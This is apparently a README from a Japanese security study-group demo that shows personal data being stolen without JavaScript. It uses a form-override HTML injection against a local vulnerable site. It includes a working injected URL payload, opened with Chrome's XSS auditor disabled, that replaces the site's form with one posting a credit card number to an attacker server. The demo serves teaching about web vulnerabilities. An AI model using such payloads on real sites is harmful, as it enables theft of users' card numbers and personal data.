# JSなしで個人情報を盗まれる例

を説明するデモです．

## 状況

XSS (_クロス_ サイト スクリプティング) の性質上，localhostの他にも別サイトが必要でした．

<dl>
  <dt>http://脆弱サイト.com:5000</dt>
  <dd>脆弱性を持ったサイト(以下，脆弱サイト)．名前とメールアドレスを打たせるフォームがある．</dd>

  <dt>http://localhost:5000</dt>
  <dd>攻撃者の用意したサイト(以下，攻撃者サイト) ．脆弱サイトのフォームを上書きして，クレカ番号まで入力させた結果を受け取る</dd>

  <dt>被害者</dt>
  <dd>脆弱サイトのユーザ．個人情報を盗まれてしまう．</dd>
</dl>

## 脆弱サイトをいじってみる

```bash
$ google-chrome http://脆弱サイト.com:8000
```

1. `/` において，名前とメールアドレスを入力
1. `/register` にて，「登録されました」と表示されることを確認

## 攻撃手順

### 攻撃者サイトを準備

```bash
$ cd 20131117-tokumaru-benkyokai/sample-sites/attacker-sites/ex01_FormOverride
$ carton install  # 大体5分以上かかります・・・・
$ carton exec perl -Ilib script/ex01_formoverride-server
$ google-chrome http://localhost:5000
```

### フォームが上書きされた脆弱サイトを開く

```bash
$ google-chrome --disable-xss-auditor 'http://脆弱サイト.com:5000/?name="></form><form action=http://localhost:5000/ method=POST>クレジットカード番号<input name=credit><br><input type=submit></form><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>'
```

「送信」ボタンを押すと，個人情報が盗まれる
